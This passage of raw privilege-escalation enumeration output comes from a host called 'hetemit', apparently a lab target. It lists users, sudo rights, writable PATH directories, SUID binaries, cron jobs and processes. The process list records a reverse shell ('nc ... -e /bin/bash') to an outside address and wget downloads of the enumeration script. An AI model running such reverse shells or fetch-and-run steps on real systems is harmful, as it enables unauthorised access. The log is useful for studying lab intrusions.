HOME=/home/cmeeks
HOSTNAME=hetemit
HOSTTYPE=x86_64
IFS=$' \t\n'
INVOCATION_ID=b72246649656455fbcec4b6780413a77
IRBRC=/home/cmeeks/.rvm/rubies/ruby-2.6.3/.irbrc
JOURNAL_STREAM=9:25046
LANG=en_US.UTF-8
LESSOPEN='||/usr/bin/lesspipe.sh %s'
LOGNAME=cmeeks
LS_COLORS=
MACHTYPE=x86_64-redhat-linux-gnu
MY_RUBY_HOME=/home/cmeeks/.rvm/rubies/ruby-2.6.3
NCAT_LOCAL_ADDR=192.168.162.117
NCAT_LOCAL_PORT=46940
NCAT_PROTO=TCP
NCAT_REMOTE_ADDR=192.168.45.151
NCAT_REMOTE_PORT=18000
OLDPWD=/home/cmeeks/restjson_hetemit
OPTERR=1
OPTIND=1
OSTYPE=linux-gnu
PATH=/home/cmeeks/.rvm/gems/ruby-2.6.3/bin:/home/cmeeks/.rvm/gems/ruby-2.6.3@global/bin:/home/cmeeks/.rvm/rubies/ruby-2.6.3/bin:/home/cmeeks/.local/bin:/home/cmeeks/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/home/cmeeks/.rvm/bin:/home/cmeeks/.rvm/bin
PPID=97066
PS4='+ '
PWD=/home/cmeeks
RUBY_VERSION=ruby-2.6.3
SHELL=/bin/bash
SHELLOPTS=braceexpand:hashall:interactive-comments
SHLVL=5
TERM=dumb
UID=1000
USER=cmeeks

[+] PATH
$ echo "$PATH"
/home/cmeeks/.rvm/gems/ruby-2.6.3/bin:/home/cmeeks/.rvm/gems/ruby-2.6.3@global/bin:/home/cmeeks/.rvm/rubies/ruby-2.6.3/bin:/home/cmeeks/.local/bin:/home/cmeeks/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/home/cmeeks/.rvm/bin:/home/cmeeks/.rvm/bin

[+] HOME and SHELL
$ echo "HOME=$HOME"; echo "SHELL=$SHELL"
HOME=/home/cmeeks
SHELL=/bin/bash


```

3. User & Home Directories

```

[+] /etc/passwd
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
systemd-coredump:x:999:997:systemd Core Dumper:/:/sbin/nologin
systemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin
tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
polkitd:x:998:996:User for polkitd:/:/sbin/nologin
libstoragemgmt:x:997:995:daemon account for libstoragemgmt:/var/run/lsm:/sbin/nologin
cockpit-ws:x:996:993:User for cockpit web service:/nonexisting:/sbin/nologin
cockpit-wsinstance:x:995:992:User for cockpit-ws instances:/nonexisting:/sbin/nologin
sssd:x:994:990:User for sssd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
chrony:x:993:989::/var/lib/chrony:/sbin/nologin
rngd:x:992:988:Random Number Generator Daemon:/var/lib/rngd:/sbin/nologin
cmeeks:x:1000:1000::/home/cmeeks:/bin/bash
unbound:x:991:987:Unbound DNS resolver:/etc/unbound:/sbin/nologin
postgres:x:26:26:PostgreSQL Server:/var/lib/pgsql:/bin/bash
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin

[+] home directories
$ ls -la /home
total 4
drwxr-xr-x.  3 root   root     20 Nov 13  2020 .
dr-xr-xr-x. 17 root   root    244 Nov 13  2020 ..
drwx------. 11 cmeeks cmeeks 4096 Jan 15 22:04 cmeeks

[+] root home (if accessible)
$ ls -la /root 2>/dev/null

[+] sudo -l
$ sudo -l 2>/dev/null
Matching Defaults entries for cmeeks on hetemit:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User cmeeks may run the following commands on hetemit:
    (root) NOPASSWD: /sbin/halt, /sbin/reboot, /sbin/poweroff

[+] sudo -V (first 10)
$ sudo -V 2>/dev/null | head -n 10
Sudo version 1.8.29
Sudoers policy plugin version 1.8.29
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.29

```

4. Writable Paths & Permissions

```
[+] world-writable directories (first 50)
$ find / -writable -type d 2>/dev/null | head -n 50
/dev/mqueue
/dev/shm
/proc/97094/task/97094/fd
/proc/97094/fd
/proc/97094/map_files
/var/spool/samba
/var/tmp
/home/cmeeks
/home/cmeeks/.gnupg
/home/cmeeks/.gnupg/crls.d
/home/cmeeks/.gnupg/private-keys-v1.d
/home/cmeeks/.rvm
/home/cmeeks/.rvm/src
/home/cmeeks/.rvm/src/rvm
/home/cmeeks/.rvm/src/rvm/.github
/home/cmeeks/.rvm/src/rvm/bin
/home/cmeeks/.rvm/src/rvm/binscripts
/home/cmeeks/.rvm/src/rvm/config
/home/cmeeks/.rvm/src/rvm/config/solaris
/home/cmeeks/.rvm/src/rvm/contrib
/home/cmeeks/.rvm/src/rvm/contrib/hudson
/home/cmeeks/.rvm/src/rvm/docs
/home/cmeeks/.rvm/src/rvm/examples
/home/cmeeks/.rvm/src/rvm/gem-cache
/home/cmeeks/.rvm/src/rvm/gemsets
/home/cmeeks/.rvm/src/rvm/gemsets/jruby
/home/cmeeks/.rvm/src/rvm/gemsets/ruby
/home/cmeeks/.rvm/src/rvm/gemsets/ruby/1.8.5
/home/cmeeks/.rvm/src/rvm/gemsets/ruby/1.8.6
/home/cmeeks/.rvm/src/rvm/gemsets/ruby/1.8.7
/home/cmeeks/.rvm/src/rvm/gemsets/truffleruby
/home/cmeeks/.rvm/src/rvm/help
/home/cmeeks/.rvm/src/rvm/help/gemset
/home/cmeeks/.rvm/src/rvm/help/rvmrc
/home/cmeeks/.rvm/src/rvm/hooks
/home/cmeeks/.rvm/src/rvm/lib
/home/cmeeks/.rvm/src/rvm/lib/rvm
/home/cmeeks/.rvm/src/rvm/man
/home/cmeeks/.rvm/src/rvm/man/man1
/home/cmeeks/.rvm/src/rvm/patches
/home/cmeeks/.rvm/src/rvm/patches/goruby
/home/cmeeks/.rvm/src/rvm/patches/jruby
/home/cmeeks/.rvm/src/rvm/patches/jruby/1.7.9
/home/cmeeks/.rvm/src/rvm/patches/libxslt-1.1.26
/home/cmeeks/.rvm/src/rvm/patches/rbx
/home/cmeeks/.rvm/src/rvm/patches/rbx/2.5.2
/home/cmeeks/.rvm/src/rvm/patches/readline-5.2
/home/cmeeks/.rvm/src/rvm/patches/readline-6.2
/home/cmeeks/.rvm/src/rvm/patches/ree
/home/cmeeks/.rvm/src/rvm/patches/ree/1.8.6

[+] world-writable files (first 50)
$ find / -writable -type f 2>/dev/null | head -n 50
/proc/sys/kernel/ns_last_pid
/proc/1/task/1/attr/current
/proc/1/task/1/attr/exec
/proc/1/task/1/attr/fscreate
/proc/1/task/1/attr/keycreate
/proc/1/task/1/attr/sockcreate
/proc/1/attr/current
/proc/1/attr/exec
/proc/1/attr/fscreate
/proc/1/attr/keycreate
/proc/1/attr/sockcreate
/proc/1/timerslack_ns
/proc/2/task/2/attr/current
/proc/2/task/2/attr/exec
/proc/2/task/2/attr/fscreate
/proc/2/task/2/attr/keycreate
/proc/2/task/2/attr/sockcreate
/proc/2/attr/current
/proc/2/attr/exec
/proc/2/attr/fscreate
/proc/2/attr/keycreate
/proc/2/attr/sockcreate
/proc/2/timerslack_ns
/proc/3/task/3/attr/current
/proc/3/task/3/attr/exec
/proc/3/task/3/attr/fscreate
/proc/3/task/3/attr/keycreate
/proc/3/task/3/attr/sockcreate
/proc/3/attr/current
/proc/3/attr/exec
/proc/3/attr/fscreate
/proc/3/attr/keycreate
/proc/3/attr/sockcreate
/proc/3/timerslack_ns
/proc/4/task/4/attr/current
/proc/4/task/4/attr/exec
/proc/4/task/4/attr/fscreate
/proc/4/task/4/attr/keycreate
/proc/4/task/4/attr/sockcreate
/proc/4/attr/current
/proc/4/attr/exec
/proc/4/attr/fscreate
/proc/4/attr/keycreate
/proc/4/attr/sockcreate
/proc/4/timerslack_ns
/proc/6/task/6/attr/current
/proc/6/task/6/attr/exec
/proc/6/task/6/attr/fscreate
/proc/6/task/6/attr/keycreate
/proc/6/task/6/attr/sockcreate

[+] PATH entries + writable check
$ echo "$PATH" | tr ':' '\n' | while read -r p; do [ -z "$p" ] && continue; if [ -w "$p" ]; then echo "WRITABLE: $p"; else echo "OK: $p"; fi; done
WRITABLE: /home/cmeeks/.rvm/gems/ruby-2.6.3/bin
WRITABLE: /home/cmeeks/.rvm/gems/ruby-2.6.3@global/bin
WRITABLE: /home/cmeeks/.rvm/rubies/ruby-2.6.3/bin
OK: /home/cmeeks/.local/bin
OK: /home/cmeeks/bin
OK: /usr/local/sbin
OK: /usr/local/bin
OK: /usr/sbin
OK: /usr/bin
WRITABLE: /home/cmeeks/.rvm/bin
WRITABLE: /home/cmeeks/.rvm/bin

[+] files owned by current user (first 50)
$ find / -user "cmeeks" -type f 2>/dev/null | head -n 50
/proc/1391/task/1391/fdinfo/0
/proc/1391/task/1391/fdinfo/1
/proc/1391/task/1391/fdinfo/2
/proc/1391/task/1391/fdinfo/3
/proc/1391/task/1391/fdinfo/4
/proc/1391/task/1391/fdinfo/5
/proc/1391/task/1391/fdinfo/6
/proc/1391/task/1391/fdinfo/7
/proc/1391/task/1391/fdinfo/8
/proc/1391/task/1391/fdinfo/9
/proc/1391/task/1391/fdinfo/10
/proc/1391/task/1391/fdinfo/11
/proc/1391/task/1391/fdinfo/12
/proc/1391/task/1391/fdinfo/13
/proc/1391/task/1391/fdinfo/14
/proc/1391/task/1391/fdinfo/16
/proc/1391/task/1391/fdinfo/17
/proc/1391/task/1391/fdinfo/18
/proc/1391/task/1391/fdinfo/19
/proc/1391/task/1391/fdinfo/20
/proc/1391/task/1391/fdinfo/21
/proc/1391/task/1391/fdinfo/22
/proc/1391/task/1391/fdinfo/23
/proc/1391/task/1391/fdinfo/24
/proc/1391/task/1391/fdinfo/25
/proc/1391/task/1391/fdinfo/27
/proc/1391/task/1391/fdinfo/28
/proc/1391/task/1391/fdinfo/30
/proc/1391/task/1391/environ
/proc/1391/task/1391/auxv
/proc/1391/task/1391/status
/proc/1391/task/1391/personality
/proc/1391/task/1391/limits
/proc/1391/task/1391/sched
/proc/1391/task/1391/comm
/proc/1391/task/1391/syscall
/proc/1391/task/1391/cmdline
/proc/1391/task/1391/stat
/proc/1391/task/1391/statm
/proc/1391/task/1391/maps
/proc/1391/task/1391/children
/proc/1391/task/1391/numa_maps
/proc/1391/task/1391/mem
/proc/1391/task/1391/mounts
/proc/1391/task/1391/mountinfo
/proc/1391/task/1391/clear_refs
/proc/1391/task/1391/smaps
/proc/1391/task/1391/smaps_rollup
/proc/1391/task/1391/pagemap
/proc/1391/task/1391/attr/current

[+] /etc/passwd perms
$ ls -l /etc/passwd 2>/dev/null
-rw-r--r-- 1 root root 1559 Nov 13  2020 /etc/passwd

[+] /etc/shadow perms
$ ls -l /etc/shadow 2>/dev/null
---------- 1 root root 940 Nov 13  2020 /etc/shadow

[+] root dir perms
$ ls -la / 2>/dev/null
total 20
dr-xr-xr-x.  17 root root  244 Nov 13  2020 .
dr-xr-xr-x.  17 root root  244 Nov 13  2020 ..
-rw-r--r--    1 root root    0 Nov 13  2020 .autorelabel
lrwxrwxrwx.   1 root root    7 May 11  2019 bin -> usr/bin
dr-xr-xr-x.   6 root root 4096 Nov 13  2020 boot
drwxr-xr-x   19 root root 3080 Jan 15 19:44 dev
drwxr-xr-x.  87 root root 8192 Jan 15 19:44 etc
drwxr-xr-x.   3 root root   20 Nov 13  2020 home
lrwxrwxrwx.   1 root root    7 May 11  2019 lib -> usr/lib
lrwxrwxrwx.   1 root root    9 May 11  2019 lib64 -> usr/lib64
drwxr-xr-x.   2 root root    6 May 11  2019 media
drwxr-xr-x.   2 root root    6 May 11  2019 mnt
drwxr-xr-x.   2 root root    6 May 11  2019 opt
dr-xr-xr-x  166 root root    0 Feb 27  2025 proc
dr-xr-x---.   2 root root  152 Jan 15 19:44 root
drwxr-xr-x   28 root root  800 Feb 27  2025 run
lrwxrwxrwx.   1 root root    8 May 11  2019 sbin -> usr/sbin
drwxr-xr-x.   2 root root    6 May 11  2019 srv
dr-xr-xr-x   13 root root    0 Feb 27  2025 sys
drwxrwxrwt.   5 root root  193 Jan 15 22:04 tmp
drwxr-xr-x.  12 root root  144 Nov 13  2020 usr
drwxr-xr-x.  22 root root 4096 Nov 13  2020 var



```

4. SUID / SGID / Capabilities

```
[+] SUID binaries
$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/crontab
/usr/bin/at
/usr/bin/passwd
/usr/bin/fusermount
/usr/sbin/grub2-set-bootflag
/usr/sbin/unix_chkpwd
/usr/sbin/pam_timestamp_check
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/libexec/dbus-1/dbus-daemon-launch-helper
/usr/libexec/cockpit-session
/usr/libexec/sssd/krb5_child
/usr/libexec/sssd/ldap_child
/usr/libexec/sssd/selinux_child
/usr/libexec/sssd/proxy_child

[+] SGID binaries
$ find / -perm -2000 -type f 2>/dev/null
/usr/bin/write
/usr/bin/locate
/usr/libexec/utempter/utempter
/usr/libexec/openssh/ssh-keysign

[+] setcap
$ getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_admin,cap_net_raw+p
/usr/bin/newgidmap = cap_setgid+ep
/usr/bin/newuidmap = cap_setuid+ep
/usr/sbin/arping = cap_net_raw+p
/usr/sbin/clockdiff = cap_net_raw+p
/usr/sbin/mtr-packet = cap_net_raw+ep
/usr/sbin/suexec = cap_setgid,cap_setuid+ep



```

5. Cron & Scheduled Tasks

```
[+] /etc/crontab
$ cat /etc/crontab 2>/dev/null
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root

# For details see man 4 crontabs

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed


[+] /etc/cron.*
$ ls -la /etc/cron.* 2>/dev/null
-rw-r--r--. 1 root root  0 Nov  8  2019 /etc/cron.deny

/etc/cron.d:
total 20
drwxr-xr-x.  2 root root   39 Nov 13  2020 .
drwxr-xr-x. 87 root root 8192 Jan 15 19:44 ..
-rw-r--r--.  1 root root  128 Nov  8  2019 0hourly
-rw-r--r--.  1 root root  108 Apr 24  2020 raid-check

/etc/cron.daily:
total 16
drwxr-xr-x.  2 root root   23 Nov 13  2020 .
drwxr-xr-x. 87 root root 8192 Jan 15 19:44 ..
-rwxr-xr-x.  1 root root  189 Jan  4  2018 logrotate

/etc/cron.hourly:
total 16
drwxr-xr-x.  2 root root   22 Nov 13  2020 .
drwxr-xr-x. 87 root root 8192 Jan 15 19:44 ..
-rwxr-xr-x.  1 root root  575 Nov  8  2019 0anacron

/etc/cron.monthly:
total 12
drwxr-xr-x.  2 root root    6 May 11  2019 .
drwxr-xr-x. 87 root root 8192 Jan 15 19:44 ..

/etc/cron.weekly:
total 12
drwxr-xr-x.  2 root root    6 May 11  2019 .
drwxr-xr-x. 87 root root 8192 Jan 15 19:44 ..

[+] user crontab

```

6. Processes & Network

```

[+] ps -ef
$ ps -ef
UID          PID    PPID  C STIME TTY          TIME CMD
root           1       0  0 18:23 ?        00:00:01 /usr/lib/systemd/systemd --switched-root --system --deserialize 16
root           2       0  0 18:23 ?        00:00:00 [kthreadd]
root           3       2  0 18:23 ?        00:00:00 [rcu_gp]
root           4       2  0 18:23 ?        00:00:00 [rcu_par_gp]
root           6       2  0 18:23 ?        00:00:00 [kworker/0:0H-kblockd]
root           7       2  0 18:23 ?        00:00:00 [kworker/u4:0-events_unbound]
root           8       2  0 18:23 ?        00:00:00 [mm_percpu_wq]
root           9       2  0 18:23 ?        00:00:00 [ksoftirqd/0]
root          10       2  0 18:23 ?        00:00:01 [rcu_sched]
root          11       2  0 18:23 ?        00:00:00 [migration/0]
root          12       2  0 18:23 ?        00:00:00 [watchdog/0]
root          13       2  0 18:23 ?        00:00:00 [cpuhp/0]
root          14       2  0 18:23 ?        00:00:00 [cpuhp/1]
root          15       2  0 18:23 ?        00:00:00 [watchdog/1]
root          16       2  0 18:23 ?        00:00:00 [migration/1]
root          17       2  0 18:23 ?        00:00:00 [ksoftirqd/1]
root          19       2  0 18:23 ?        00:00:00 [kworker/1:0H-kblockd]
root          21       2  0 18:23 ?        00:00:00 [kdevtmpfs]
root          22       2  0 18:23 ?        00:00:00 [netns]
root          23       2  0 18:23 ?        00:00:00 [kauditd]
root          25       2  0 18:23 ?        00:00:00 [khungtaskd]
root          26       2  0 18:23 ?        00:00:00 [oom_reaper]
root          27       2  0 18:23 ?        00:00:00 [writeback]
root          28       2  0 18:23 ?        00:00:00 [kcompactd0]
root          29       2  0 18:23 ?        00:00:00 [ksmd]
root          30       2  0 18:23 ?        00:00:00 [khugepaged]
root          31       2  0 18:23 ?        00:00:00 [crypto]
root          32       2  0 18:23 ?        00:00:00 [kintegrityd]
root          33       2  0 18:23 ?        00:00:00 [kblockd]
root          35       2  0 18:23 ?        00:00:00 [tpm_dev_wq]
root          36       2  0 18:23 ?        00:00:00 [md]
root          37       2  0 18:23 ?        00:00:00 [edac-poller]
root          38       2  0 18:23 ?        00:00:00 [kworker/u4:1-events_unbound]
root          39       2  0 18:23 ?        00:00:00 [watchdogd]
root          66       2  0 18:23 ?        00:00:00 [kswapd0]
root         159       2  0 18:23 ?        00:00:00 [kthrotld]
root         160       2  0 18:23 ?        00:00:00 [irq/24-pciehp]
root         161       2  0 18:23 ?        00:00:00 [irq/25-pciehp]
root         162       2  0 18:23 ?        00:00:00 [irq/26-pciehp]
root         163       2  0 18:23 ?        00:00:00 [irq/27-pciehp]
root         164       2  0 18:23 ?        00:00:00 [irq/28-pciehp]
root         165       2  0 18:23 ?        00:00:00 [irq/29-pciehp]
root         166       2  0 18:23 ?        00:00:00 [irq/30-pciehp]
root         167       2  0 18:23 ?        00:00:00 [irq/31-pciehp]
root         168       2  0 18:23 ?        00:00:00 [irq/32-pciehp]
root         169       2  0 18:23 ?        00:00:00 [irq/33-pciehp]
root         170       2  0 18:23 ?        00:00:00 [irq/34-pciehp]
root         171       2  0 18:23 ?        00:00:00 [irq/35-pciehp]
root         172       2  0 18:23 ?        00:00:00 [irq/36-pciehp]
root         173       2  0 18:23 ?        00:00:00 [irq/37-pciehp]
root         174       2  0 18:23 ?        00:00:00 [irq/38-pciehp]
root         175       2  0 18:23 ?        00:00:00 [irq/39-pciehp]
root         176       2  0 18:23 ?        00:00:00 [irq/40-pciehp]
root         177       2  0 18:23 ?        00:00:00 [irq/41-pciehp]
root         178       2  0 18:23 ?        00:00:00 [irq/42-pciehp]
root         179       2  0 18:23 ?        00:00:00 [irq/43-pciehp]
root         180       2  0 18:23 ?        00:00:00 [irq/44-pciehp]
root         181       2  0 18:23 ?        00:00:00 [irq/45-pciehp]
root         182       2  0 18:23 ?        00:00:00 [irq/46-pciehp]
root         183       2  0 18:23 ?        00:00:00 [irq/47-pciehp]
root         184       2  0 18:23 ?        00:00:00 [irq/48-pciehp]
root         185       2  0 18:23 ?        00:00:00 [irq/49-pciehp]
root         186       2  0 18:23 ?        00:00:00 [irq/50-pciehp]
root         187       2  0 18:23 ?        00:00:00 [irq/51-pciehp]
root         188       2  0 18:23 ?        00:00:00 [irq/52-pciehp]
root         189       2  0 18:23 ?        00:00:00 [irq/53-pciehp]
root         190       2  0 18:23 ?        00:00:00 [irq/54-pciehp]
root         191       2  0 18:23 ?        00:00:00 [irq/55-pciehp]
root         192       2  0 18:23 ?        00:00:00 [acpi_thermal_pm]
root         193       2  0 18:23 ?        00:00:00 [kmpath_rdacd]
root         194       2  0 18:23 ?        00:00:00 [kaluad]
root         196       2  0 18:23 ?        00:00:00 [ipv6_addrconf]
root         197       2  0 18:23 ?        00:00:00 [kstrp]
root         491       2  0 18:23 ?        00:00:00 [ata_sff]
root         493       2  0 18:23 ?        00:00:00 [scsi_eh_0]
root         494       2  0 18:23 ?        00:00:00 [scsi_tmf_0]
root         496       2  0 18:23 ?        00:00:00 [scsi_eh_1]
root         498       2  0 18:23 ?        00:00:00 [scsi_tmf_1]
root         512       2  0 18:23 ?        00:00:00 [kworker/1:1H-kblockd]
root         514       2  0 18:23 ?        00:00:00 [kworker/0:1H-kblockd]
root         569       2  0 18:23 ?        00:00:00 [kdmflush]
root         578       2  0 18:23 ?        00:00:00 [kdmflush]
root         608       2  0 18:23 ?        00:00:00 [xfsalloc]
root         609       2  0 18:23 ?        00:00:00 [xfs_mru_cache]
root         610       2  0 18:23 ?        00:00:00 [xfs-buf/dm-0]
root         611       2  0 18:23 ?        00:00:00 [xfs-conv/dm-0]
root         612       2  0 18:23 ?        00:00:00 [xfs-cil/dm-0]
root         613       2  0 18:23 ?        00:00:00 [xfs-reclaim/dm-]
root         614       2  0 18:23 ?        00:00:00 [xfs-log/dm-0]
root         615       2  0 18:23 ?        00:00:00 [xfs-eofblocks/d]
root         616       2  0 18:23 ?        00:00:00 [xfsaild/dm-0]
root         710       1  0 18:23 ?        00:00:08 /usr/lib/systemd/systemd-journald
root         744       1  0 18:23 ?        00:00:00 /usr/lib/systemd/systemd-udevd
root         791       2  0 18:23 ?        00:00:00 [irq/16-vmwgfx]
root         792       2  0 18:23 ?        00:00:00 [ttm_swap]
root         830       2  0 18:23 ?        00:00:00 [jbd2/sda2-8]
root         831       2  0 18:23 ?        00:00:00 [ext4-rsv-conver]
root         855       1  0 18:23 ?        00:00:00 /sbin/auditd
root         878       1  0 18:23 ?        00:00:00 /usr/bin/VGAuthService -s
root         879       1  0 18:23 ?        00:00:06 /usr/bin/vmtoolsd
root         881       1  0 18:23 ?        00:00:00 /usr/sbin/irqbalance --foreground
dbus         883       1  0 18:23 ?        00:00:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
polkitd      889       1  0 18:23 ?        00:00:00 /usr/lib/polkit-1/polkitd --no-debug
root         890       1  0 18:23 ?        00:00:00 /usr/sbin/sssd -i --logger=files
root         894       1  0 18:23 ?        00:00:00 /usr/sbin/smartd -n -q never
libstor+     895       1  0 18:23 ?        00:00:00 /usr/bin/lsmd -d
rngd         897       1  0 18:23 ?        00:00:03 /sbin/rngd -f --fill-watermark=0
root         938       1  0 18:23 ?        00:00:01 /usr/libexec/platform-python -Es /usr/sbin/tuned -l -P
root         946       1  0 18:23 ?        00:00:00 /usr/sbin/sshd -D -oCiphers=aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes256-ctr,aes256-cbc,aes128-gcm@openssh.com,aes128-ctr,aes128-cbc -oMACs=hmac-sha2-256-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha1,umac-128@openssh.com,hmac-sha2-512 -oGSSAPIKexAlgorithms=gss-gex-sha1-,gss-group14-sha1- -oKexAlgorithms=curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1 -oHostKeyAlgorithms=rsa-sha2-256,rsa-sha2-256-cert-v01@openssh.com,ecdsa-sha2-nistp256,ecdsa-sha2-nistp256-cert-v01@openssh.com,ecdsa-sha2-nistp384,ecdsa-sha2-nistp384-cert-v01@openssh.com,rsa-sha2-512,rsa-sha2-512-cert-v01@openssh.com,ecdsa-sha2-nistp521,ecdsa-sha2-nistp521-cert-v01@openssh.com,ssh-ed25519,ssh-ed25519-cert-v01@openssh.com,ssh-rsa,ssh-rsa-cert-v01@openssh.com -oPubkeyAcceptedKeyTypes=rsa-sha2-256,rsa-sha2-256-cert-v01@openssh.com,ecdsa-sha2-nistp256,ecdsa-sha2-nistp256-cert-v01@openssh.com,ecdsa-sha2-nistp384,ecdsa-sha2-nistp384-cert-v01@openssh.com,rsa-sha2-512,rsa-sha2-512-cert-v01@openssh.com,ecdsa-sha2-nistp521,ecdsa-sha2-nistp521-cert-v01@openssh.com,ssh-ed25519,ssh-ed25519-cert-v01@openssh.com,ssh-rsa,ssh-rsa-cert-v01@openssh.com -oCASignatureAlgorithms=rsa-sha2-256,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,rsa-sha2-512,ecdsa-sha2-nistp521,ssh-ed25519,ssh-rsa
root         953       1  0 18:23 ?        00:00:00 /usr/sbin/httpd -DFOREGROUND
root         961       1  0 18:23 ?        00:00:00 /usr/sbin/vsftpd /etc/vsftpd/vsftpd.conf
postgres     973       1  0 18:23 ?        00:00:00 /usr/bin/postmaster -D /var/lib/pgsql/data
root        1004     890  0 18:23 ?        00:00:00 /usr/libexec/sssd/sssd_be --domain implicit_files --uid 0 --gid 0 --logger=files
root        1007     890  0 18:23 ?        00:00:00 /usr/libexec/sssd/sssd_nss --uid 0 --gid 0 --logger=files
postgres    1008     973  0 18:23 ?        00:00:00 postgres: logger process   
root        1010       1  0 18:23 ?        00:00:00 /usr/lib/systemd/systemd-logind
root        1013       1  0 18:23 ?        00:00:00 /usr/sbin/atd -f
root        1014       1  0 18:23 tty1     00:00:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root        1015       1  0 18:23 ?        00:00:00 /usr/sbin/crond -n
postgres    1026     973  0 18:23 ?        00:00:00 postgres: checkpointer process   
postgres    1027     973  0 18:23 ?        00:00:00 postgres: writer process   
postgres    1028     973  0 18:23 ?        00:00:00 postgres: wal writer process   
postgres    1029     973  0 18:23 ?        00:00:00 postgres: autovacuum launcher process   
postgres    1030     973  0 18:23 ?        00:00:00 postgres: stats collector process   
postgres    1031     973  0 18:23 ?        00:00:00 postgres: bgworker: logical replication launcher   
cmeeks      1391       1  0 18:23 ?        00:00:06 puma 4.3.6 (tcp://0.0.0.0:18000) [register_hetemit]
cmeeks      1392       1  0 18:23 ?        00:01:34 /usr/bin/python3.6 /usr/local/bin/flask run -h 0.0.0.0 -p 50000
root        1394       1  0 18:23 ?        00:00:00 /usr/sbin/smbd --foreground --no-process-group
root        1673    1394  0 18:23 ?        00:00:00 /usr/sbin/smbd --foreground --no-process-group
root        1674    1394  0 18:23 ?        00:00:00 /usr/sbin/smbd --foreground --no-process-group
root        1677    1394  0 18:23 ?        00:00:00 /usr/sbin/smbd --foreground --no-process-group
systemd+    1979       1  0 19:44 ?        00:00:00 /usr/lib/systemd/systemd-resolved
root        1995       1  0 19:44 ?        00:00:00 /usr/sbin/NetworkManager --no-daemon
root        1997       2  0 19:44 ?        00:00:02 [kworker/1:3-xfs-buf/dm-0]
apache      2146     953  0 20:18 ?        00:00:00 /usr/sbin/httpd -DFOREGROUND
apache      2147     953  0 20:18 ?        00:00:00 /usr/sbin/httpd -DFOREGROUND
apache      2148     953  0 20:18 ?        00:00:00 /usr/sbin/httpd -DFOREGROUND
apache      2149     953  0 20:18 ?        00:00:00 /usr/sbin/httpd -DFOREGROUND
root        2405       2  0 20:33 ?        00:00:00 [kworker/0:3-events_power_efficient]
root       96693       2  0 21:33 ?        00:00:00 [kworker/1:2-events_power_efficient]
root       96823       2  0 21:54 ?        00:00:00 [kworker/0:0-ata_sff]
cmeeks     96824       1  0 21:55 ?        00:00:00 wget 192.168.45.151:443/pg_privesc.sh
cmeeks     96942       1  0 21:57 ?        00:00:00 wget 192.168.45.141:445/pg_privesc.sh
root       96947       2  0 21:59 ?        00:00:00 [kworker/0:1-ata_sff]
cmeeks     96963    1392  0 22:02 ?        00:00:00 nc 192.168.45.151 18000 -e /bin/bash
cmeeks     96964   96963  0 22:02 ?        00:00:00 /bin/bash
cmeeks     96966   96964  0 22:03 ?        00:00:00 python3 -c import pty; pty.spawn("/bin/bash")
cmeeks     96967   96966  0 22:03 pts/2    00:00:00 /bin/bash
cmeeks     97066   96967  0 22:04 pts/2    00:00:00 bash ./pg_privesc.sh
cmeeks     97068   97066  0 22:04 pts/2    00:00:00 bash ./pg_privesc.sh
cmeeks     97069   97068  0 22:04 pts/2    00:00:00 tee -a privesc_2026-01-15_220445.txt
root       97100       2  0 22:04 ?        00:00:00 [kworker/1:0-events]
